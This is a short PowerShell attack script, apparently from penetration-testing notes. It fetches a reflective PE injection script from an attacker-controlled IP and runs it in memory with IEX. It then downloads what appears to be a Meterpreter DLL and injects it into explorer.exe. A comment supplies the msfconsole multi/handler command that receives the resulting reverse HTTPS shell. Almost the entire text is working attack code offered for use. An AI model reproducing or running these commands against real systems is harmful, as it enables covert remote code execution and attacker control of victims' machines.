# This script downloads from a webserver some scripts and execute its directly from memory performing a reflective DLL Injection.

IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.208/Invoke-ReflectivePEInjection.ps1')
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.208/met.dll')
$procid = (Get-Process -Name explorer).Id
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

# This gives as a result a connection you can retrieve with a multi/handler:

#       msfconsole -qx "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST $(hostname -I | cut -d ' ' -f2);set LPORT 4444;run"

